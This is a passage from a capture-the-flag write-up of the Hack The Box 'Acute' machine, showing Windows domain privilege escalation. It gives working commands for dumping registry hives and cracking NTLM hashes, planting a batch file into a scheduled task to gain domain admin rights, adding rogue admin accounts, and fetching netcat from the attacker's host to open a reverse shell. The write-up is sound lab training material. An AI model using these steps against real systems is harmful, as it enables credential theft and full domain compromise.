PS C:\Utils> Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

```

It hangs, but there’s a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.145 49877
Microsoft Windows [Version 10.0.19044.1466]
(c) Microsoft Corporation. All rights reserved.

C:\Users\jmorgan\Documents>

```

Alternatively, I could modify it to add edavies to the administrators group, and get equivalent access.

## Execution as awallace on ATSSERVER

### Get Password

#### Dump Hives

As a local administrator on Acute-PC01, jmorgan can create backups of the registry hives:

```

PS C:\Utils> reg save HKLM\sam sam.bak
The operation completed successfully.
PS C:\Utils> reg save HKLM\system sys.bak
The operation completed successfully.

```

If I want copies, I have to create copies, as I can’t directory open the running hive files.

Since I have a Meterpreter session on the box, I’ll use that to download the files:

```

meterpreter > download sam.bak
[*] Downloading: sam.bak -> ~/hackthebox/acute-10.10.11.145/sam.bak
[*] Downloaded 56.00 KiB of 56.00 KiB (100.0%): sam.bak -> ~/hackthebox/acute-10.10.11.145/sam.bak
[*] download   : sam.bak -> ~/hackthebox/acute-10.10.11.145/sam.bak
meterpreter > download sys.bak
[*] Downloading: sys.bak -> ~/hackthebox/acute-10.10.11.145/sys.bak
[*] Downloaded 1.00 MiB of 11.58 MiB (8.64%): sys.bak -> ~/hackthebox/acute-10.10.11.145/sys.bak
...[snip]...
[*] Downloaded 11.58 MiB of 11.58 MiB (100.0%): sys.bak -> ~/hackthebox/acute-10.10.11.145/sys.bak
[*] download   : sys.bak -> ~/hackthebox/acute-10.10.11.145/sys.bak

```

#### Get Hashes

I’ll use `secretsdump.py` (part of [Impacket](https://github.com/SecureAuthCorp/impacket)) to get hashes from these hives in `LOCAL` mode:

```

oxdf@hacky$ secretsdump.py -sam sam.bak -system sys.bak LOCAL
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
[*] Cleaning up... 

```

#### Crack

I’ll save the hashes to a file, and use `hashcat` to run `rockyou.txt` over them:

```

$ /opt/hashcat-6.2.5/hashcat.bin acute-pc01.hashes /usr/share/wordlists/rockyou.txt
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1000 | NTLM | Operating System
...[snip]...
31d6cfe0d16ae931b73c59d7e0c089c0:                         
a29f7623fd11550def0192de9246f46b:Password@123  
...[snip]...

```

It cracks the empty password for Guest (normal), and “Password@123” for Administrator.

### Password Reuse

I’ll first test these creds to see if any of the known users can log into PSWA, but none succeed. I do find that I’m able to run commands on ATSSERVER as awallace:

```

PS C:\Utils> $pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force
PS C:\Utils> $cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)
PS C:\Utils> Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } 
acute\awallace

```

## Shell as Site Admin

### Enumeration

With different credentials, I’ll try `C:\program files\keepmeon` again, and awallace can access it:

```

PS C:\Utils> Invoke-Command -ScriptBlock { ls '\program files\keepmeon' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

    Directory: C:\program files\keepmeon

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-a----        21/12/2021     14:57            128 keepmeon.bat                       ATSSERVER

```

It’s a single `.bat` file, which awallace can read:

```

REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
PS C:\

```

It’s simply looping over any `.bat` files in this directory, and if they aren’t this one, running them. The comment says it runs every five minutes, and it’s for Lois.

### Site Admin

#### Enumeration

In the Word doc, there was a comment about how Lois could add people to become “site admin”. Looking at the groups for this domain, there’s one called `Site_Admin`:

```

PS C:\Utils> Invoke-Command -ScriptBlock { net group /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

Group Accounts for \\
-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Managers
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Site_Admin
The command completed with one or more errors.

```

It’s description says it’s for emergencies and has access to Domain Admins:

```

PS C:\Utils> Invoke-Command -ScriptBlock { net group Site_Admin /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members
-------------------------------------------------------------------------------
The command completed successfully.

```

#### Add awallace

Given that `.bat` scripts are being run by Lois every five minutes, I’ll write a script to add awallace to `Site_Admin`:

```

PS C:\Utils> Invoke-Command -ScriptBlock { Set-Content -Path '\program files\keepmeon\0xdf.bat' -Value 'net group site_admin awallace /add /domain'} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credenti
al $cred
PS C:\Utils> Invoke-Command -ScriptBlock { cat '\program files\keepmeon\0xdf.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
net group site_admin awallace /add /domain

```

I’ll note there’s no members of `Site_Admin` above (it’s only for emergencies), but after a few minutes, awallace is added:

```

PS C:\Utils> Invoke-Command -ScriptBlock { net group Site_Admin /domain  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members
-------------------------------------------------------------------------------
awallace                 
The command completed successfully.

```

That’s actually enough to read `root.txt`:

```

PS C:\Utils> Invoke-Command -ScriptBlock { cat \users\administrator\desktop\root.txt  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
5a14532a55ecc6c7cf9faa6f3f6317b5

```

### Shell

From here, it should be possible to get a shell. As a member of `Site_Admin`, awallace can now connect without the `dc_manage` configuration, opening all sorts of commands and privileges:

```

PS C:\Utils> Invoke-Command -ScriptBlock { whoami /priv  } -ComputerName ATSSERVER -Credential $cred

PRIVILEGES INFORMATION                                                                                   
----------------------

Privilege Name                            Description                                                        State                                                                                                 
========================================= ================================================================== =======                                                                                               
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled                                                                                               
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled    
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled                                                                                               
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled                                                                                               
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled                                                                                               
SeBackupPrivilege                         Back up files and directories                                      Enabled                                                                                               
SeRestorePrivilege                        Restore files and directories                                      Enabled                                                                                               
SeShutdownPrivilege                       Shut down the system                                               Enabled                                                                                               
SeDebugPrivilege                          Debug programs                                                     Enabled                                                                                               
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled      
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled                                                                                               SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled                                                                                               
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled                                                                                               
SeCreateGlobalPrivilege                   Create global objects                                              Enabled                                                                                               
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled                                                                                               
SeTimeZonePrivilege                       Change the time zone                                               Enabled                                                                                               
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled               
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```

These permissions do get reset periodically, so I’ll try adding another user:

```

PS C:\Utils> Invoke-Command -ScriptBlock { net user 0xdf abcdABCD1234!@#$ /add /domain /Y } -ComputerName ATSSERVER -Credential $cred
The command completed successfully.

```

(This took me many tries to get the password complexity enough and add `/Y` to override a prompt.)

And adding it to `Domain Admins`:

```

PS C:\Utils> Invoke-Command -ScriptBlock { net group "Domain Admins" 0xdf /add /domain } -ComputerName ATSSERVER -Credential $cred
Invoke-Command -ScriptBlock { net group "Domain Admins" 0xdf /add /domain } -ComputerName ATSSERVER -Credential $cred
The command completed successfully.

```

But these users get flushed periodically as well.

Back to awallace, I’ll upload `nc64.exe` and call it:

```

PS C:\Utils> Invoke-Command -ComputerName ATSSERVER -Credential $cred -ScriptBlock { wget 10.10.14.6/nc64.exe -outfile \programdata\nc64.exe }
PS C:\utils> Invoke-Command -ComputerName ATSSERVER -Credential $cred -ScriptBlock { \programdata\nc64.exe -e cmd 10.10.14.6 444}

```

At a listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.145 56958
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\awallace\Documents>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```